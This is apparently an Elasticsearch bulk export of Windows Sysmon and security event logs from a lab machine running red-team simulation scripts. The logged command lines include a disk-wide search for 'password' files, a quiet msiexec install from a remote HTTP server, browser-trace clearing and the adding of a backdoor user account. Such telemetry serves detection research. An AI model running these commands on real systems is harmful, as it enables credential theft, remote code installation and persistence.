{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"-V_08WUBfVn9xHWiJzvh"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:09:37.264","Image":"C:\\Windows\\SysWOW64\\findstr.exe","Hashes":"MD5=18F02C555FBC9885DF9DB77754D6BB9B,SHA256=28FEB2FEC791EF44CF24A61C4BF175B00DBA030B53AB1B5B36AED898A2F5CF37","ParentProcessGuid":"{2D3B23BE-4A91-5BA2-0000-001006F40E00}","User":"flare-PC\\flare","Description":"Dienstprogramm \"Find String\" (QGREP)","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"dir c:\\ /s /b | findstr password\"","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"findstr  password","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3448","Company":"Microsoft Corporation","IntegrityLevel":"Medium","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","TerminalSessionId":"1","ParentProcessId":"2448","ProcessGuid":"{2D3B23BE-4A91-5BA2-0000-00100EF70E00}"},"@timestamp":"2018-09-19T13:09:37.264Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:37.264\nProcessGuid: {2D3B23BE-4A91-5BA2-0000-00100EF70E00}\nProcessId: 3448\nImage: C:\\Windows\\SysWOW64\\findstr.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Dienstprogramm \"Find String\" (QGREP)\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: findstr  password\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=18F02C555FBC9885DF9DB77754D6BB9B,SHA256=28FEB2FEC791EF44CF24A61C4BF175B00DBA030B53AB1B5B36AED898A2F5CF37\nParentProcessGuid: {2D3B23BE-4A91-5BA2-0000-001006F40E00}\nParentProcessId: 2448\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"dir c:\\ /s /b | findstr password\"","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"type":"wineventlog","host":{"name":"flare-PC"},"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1253","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"GF_18WUBfVn9xHWiGDyS"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4ACC-5BA2-0000-0010B2311300}","Product":"?","UtcTime":"2018-09-19 13:10:36.660","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","Description":"?","User":"flare-PC\\flare","LogonId":"0xe320","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","FileVersion":"?","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msbuild_network.py\"","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msbuild_network.py","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ParentProcessId":"3828","Company":"?","IntegrityLevel":"Medium","TerminalSessionId":"1","ProcessId":"3792","Image":"C:\\Program Files (x86)\\Python27\\python.exe","ProcessGuid":"{2D3B23BE-4ACC-5BA2-0000-0010EB321300}"},"@timestamp":"2018-09-19T13:10:36.660Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:10:36.660\nProcessGuid: {2D3B23BE-4ACC-5BA2-0000-0010EB321300}\nProcessId: 3792\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msbuild_network.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4ACC-5BA2-0000-0010B2311300}\nParentProcessId: 3828\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msbuild_network.py\"","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1285","event_id":1,"version":5,"host":{"name":"flare-PC"},"task":"Process Create (rule: ProcessCreate)","user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"_l_08WUBfVn9xHWi7ztG"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:10:26.897","UtcTime":"2018-09-19 13:10:26.897","Image":"C:\\Program Files (x86)\\Python27\\python.exe","TargetFilename":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\mydotnet.exe","ProcessId":"3096","ProcessGuid":"{2D3B23BE-4A9F-5BA2-0000-0010A9841100}"},"@timestamp":"2018-09-19T13:10:26.897Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:10:26.897\nProcessGuid: {2D3B23BE-4A9F-5BA2-0000-0010A9841100}\nProcessId: 3096\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nTargetFilename: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\mydotnet.exe\nCreationUtcTime: 2018-09-19 13:10:26.897","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1257","event_id":11,"host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"version":2,"task":"File created (rule: FileCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"9F_z8WUBfVn9xHWi_Dti"}}
{"thread_id":3348,"event_data":{"SubjectDomainName":"NT-AUTORITÄT","SubjectLogonId":"0x3e7","SubjectUserName":"SYSTEM","PrivilegeList":"SeAssignPrimaryTokenPrivilege\n\t\t\tSeTcbPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeImpersonatePrivilege","SubjectUserSid":"S-1-5-18"},"@timestamp":"2018-09-19T13:09:26.002Z","log_name":"Security","keywords":["Überwachung erfolgreich"],"level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Security-Auditing","process_id":512,"message":"Einer neuen Anmeldung wurden besondere Rechte zugewiesen.\n\nAntragsteller:\n\tSicherheits-ID:\t\tS-1-5-18\n\tKontoname:\t\tSYSTEM\n\tKontodomäne:\t\tNT-AUTORITÄT\n\tAnmelde-ID:\t\t0x3e7\n\nBerechtigungen:\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeTcbPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeImpersonatePrivilege","@version":"1","provider_guid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Spezielle Anmeldung","record_number":"16744","type":"wineventlog","host":{"name":"flare-PC"},"event_id":4672,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"LF_18WUBfVn9xHWiaTxH"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","ParentProcessGuid":"{2D3B23BE-4ADE-5BA2-0000-0010D64B1400}","UtcTime":"2018-09-19 13:10:55.685","Hashes":"MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670","User":"flare-PC\\flare","Description":"Windows-Hostprozess (Rundll32)","Image":"C:\\Windows\\SysWOW64\\rundll32.exe","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msiexec_http_installer.py","Company":"Microsoft Corporation","CommandLine":"RunDll32.exe InetCpl.cpl, ClearMyTracksByProcess 8","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","ProcessId":"3800","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","IntegrityLevel":"Medium","TerminalSessionId":"1","Product":"Betriebssystem Microsoft® Windows®","ParentProcessId":"3448","ProcessGuid":"{2D3B23BE-4ADF-5BA2-0000-001051761400}"},"@timestamp":"2018-09-19T13:10:55.685Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:10:55.685\nProcessGuid: {2D3B23BE-4ADF-5BA2-0000-001051761400}\nProcessId: 3800\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows-Hostprozess (Rundll32)\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: RunDll32.exe InetCpl.cpl, ClearMyTracksByProcess 8\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670\nParentProcessGuid: {2D3B23BE-4ADE-5BA2-0000-0010D64B1400}\nParentProcessId: 3448\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msiexec_http_installer.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1304","version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"Ll_18WUBfVn9xHWicjxS"}}
{"thread_id":3144,"@timestamp":"2018-09-19T13:10:57.395Z","user_data":{"RmSessionId":"0","UTCStartTime":"2018-09-19T13:10:57.395507800Z","xml_name":"RmSessionEvent"},"log_name":"Application","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-RestartManager","process_id":172,"@version":"1","provider_guid":"{0888E5EF-9B98-4695-979D-E92CE4247224}","message":"Sitzung wird gestartet: 0 - ‎2018‎-‎09‎-‎19T13:10:57.395507800Z.","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"2397","event_id":10000,"host":{"name":"flare-PC"},"user":{"name":"flare","identifier":"S-1-5-21-4019173901-3792766986-1456451320-1001","domain":"flare-PC","type":"User"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"N1_18WUBfVn9xHWidjxB"}}
{"event_data":{"param1":"http://172.16.100.10:8000/bin/Installer.msi","param5":"(NULL)","param3":"(NULL)","param4":"(NULL)","param6":"(NULL)","param2":"3468"},"@timestamp":"2018-09-19T13:10:58.000Z","keywords":["Klassisch"],"log_name":"Application","level":"Informationen","computer_name":"flare-PC","source_name":"MsiInstaller","message":"Eine Windows Installer-Transaktion wird beendet: http://172.16.100.10:8000/bin/Installer.msi. Clientprozess-ID: 3468.","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1042,"record_number":"2400","host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"PV_18WUBfVn9xHWiejw7"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:10:58.652","Image":"C:\\Windows\\SysWOW64\\msiexec.exe","Hashes":"MD5=3C4C3A520CE2B15C81307D800FC2B7F6,SHA256=02D54BBA4210372805393E907827C3A8C1076BDE5DE0C9C63443104306BECA8D","ParentProcessGuid":"{2D3B23BE-4ADE-5BA2-0000-0010D64B1400}","Description":"Windows® Installer","FileVersion":"5.0.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msiexec_http_installer.py","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"msiexec /quiet /uninstall http://172.16.100.10:8000/bin/Installer.msi","ParentProcessId":"3448","ProcessId":"3644","TerminalSessionId":"1","IntegrityLevel":"Medium","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","Product":"Windows Installer - Unicode","ProcessGuid":"{2D3B23BE-4AE2-5BA2-0000-00100ED41400}"},"@timestamp":"2018-09-19T13:10:58.652Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:10:58.652\nProcessGuid: {2D3B23BE-4AE2-5BA2-0000-00100ED41400}\nProcessId: 3644\nImage: C:\\Windows\\SysWOW64\\msiexec.exe\nFileVersion: 5.0.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows® Installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nCommandLine: msiexec /quiet /uninstall http://172.16.100.10:8000/bin/Installer.msi\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=3C4C3A520CE2B15C81307D800FC2B7F6,SHA256=02D54BBA4210372805393E907827C3A8C1076BDE5DE0C9C63443104306BECA8D\nParentProcessGuid: {2D3B23BE-4ADE-5BA2-0000-0010D64B1400}\nParentProcessId: 3448\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msiexec_http_installer.py","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1314","user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"host":{"name":"flare-PC"},"version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"P1_18WUBfVn9xHWiejw8"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:10:58.560","Image":"C:\\Windows\\system32\\msiexec.exe","Details":"(Empty)","EventType":"SetValue","TargetObject":"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{8D6D91A4-04F6-4117-972D-7BCC8B4160DC}\\URLUpdateInfo","ProcessId":"172","ProcessGuid":"{2D3B23BE-4AE1-5BA2-0000-0010C9BA1400}"},"@timestamp":"2018-09-19T13:10:58.563Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Registry value set:\nRuleName: \nEventType: SetValue\nUtcTime: 2018-09-19 13:10:58.560\nProcessGuid: {2D3B23BE-4AE1-5BA2-0000-0010C9BA1400}\nProcessId: 172\nImage: C:\\Windows\\system32\\msiexec.exe\nTargetObject: HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{8D6D91A4-04F6-4117-972D-7BCC8B4160DC}\\URLUpdateInfo\nDetails: (Empty)","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1313","task":"Registry value set (rule: RegistryEvent)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"event_id":13,"version":2,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"Tl_18WUBfVn9xHWikjy1"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","ParentProcessGuid":"{2D3B23BE-4AE7-5BA2-0000-001085E91400}","UtcTime":"2018-09-19 13:11:04.212","Hashes":"MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670","Image":"C:\\Windows\\SysWOW64\\rundll32.exe","Description":"Windows-Hostprozess (Rundll32)","Product":"Betriebssystem Microsoft® Windows®","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msxsl_network.py","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"Microsoft Corporation","ParentProcessId":"3892","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","ProcessId":"3816","IntegrityLevel":"Medium","User":"flare-PC\\flare","CommandLine":"RunDll32.exe InetCpl.cpl, ClearMyTracksByProcess 8","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4AE8-5BA2-0000-001040141500}"},"@timestamp":"2018-09-19T13:11:04.212Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:04.212\nProcessGuid: {2D3B23BE-4AE8-5BA2-0000-001040141500}\nProcessId: 3816\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows-Hostprozess (Rundll32)\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: RunDll32.exe InetCpl.cpl, ClearMyTracksByProcess 8\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=C648901695E275C8F2AD04B687A68CE2,SHA256=3FA4912EB43FC304652D7B01F118589259861E2D628FA7C86193E54D5F987670\nParentProcessGuid: {2D3B23BE-4AE7-5BA2-0000-001085E91400}\nParentProcessId: 3892\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msxsl_network.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1323","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"XF_18WUBfVn9xHWimjy8"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4AEA-5BA2-0000-001072641500}","LogonId":"0xe320","UtcTime":"2018-09-19 13:11:07.586","Hashes":"MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56","User":"flare-PC\\flare","Description":"Net Command","Product":"Microsoft® Windows® Operating System","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","Image":"C:\\Windows\\SysWOW64\\net.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"net.exe user macgyver /delete /domain","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"3940","ParentProcessId":"2532","IntegrityLevel":"Medium","Company":"Microsoft Corporation","TerminalSessionId":"1","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\net_user_add.py","ProcessGuid":"{2D3B23BE-4AEB-5BA2-0000-0010549F1500}"},"@timestamp":"2018-09-19T13:11:07.586Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:07.586\nProcessGuid: {2D3B23BE-4AEB-5BA2-0000-0010549F1500}\nProcessId: 3940\nImage: C:\\Windows\\SysWOW64\\net.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: net.exe user macgyver /delete /domain\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56\nParentProcessGuid: {2D3B23BE-4AEA-5BA2-0000-001072641500}\nParentProcessId: 2532\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\net_user_add.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1341","event_id":1,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"version":5,"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"VF_18WUBfVn9xHWimjy8"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","Product":"Microsoft® Windows® Operating System","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","Description":"Net Command","Image":"C:\\Windows\\SysWOW64\\net1.exe","ParentProcessGuid":"{2D3B23BE-4AEB-5BA2-0000-0010D58E1500}","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"net.exe user macgyver $w!$$@rmy11 /add /fullname:\"Angus Macgyver\"","UtcTime":"2018-09-19 13:11:07.368","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Windows\\system32\\net1 user macgyver $w!$$@rmy11 /add /fullname:\"Angus Macgyver\"","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","TerminalSessionId":"1","ProcessId":"628","IntegrityLevel":"Medium","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","ParentProcessId":"340","ProcessGuid":"{2D3B23BE-4AEB-5BA2-0000-00101A901500}"},"@timestamp":"2018-09-19T13:11:07.368Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:07.368\nProcessGuid: {2D3B23BE-4AEB-5BA2-0000-00101A901500}\nProcessId: 628\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 user macgyver $w!$$@rmy11 /add /fullname:\"Angus Macgyver\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4AEB-5BA2-0000-0010D58E1500}\nParentProcessId: 340\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net.exe user macgyver $w!$$@rmy11 /add /fullname:\"Angus Macgyver\"","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1330","event_id":1,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"version":5,"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"XV_18WUBfVn9xHWimjy8"}}
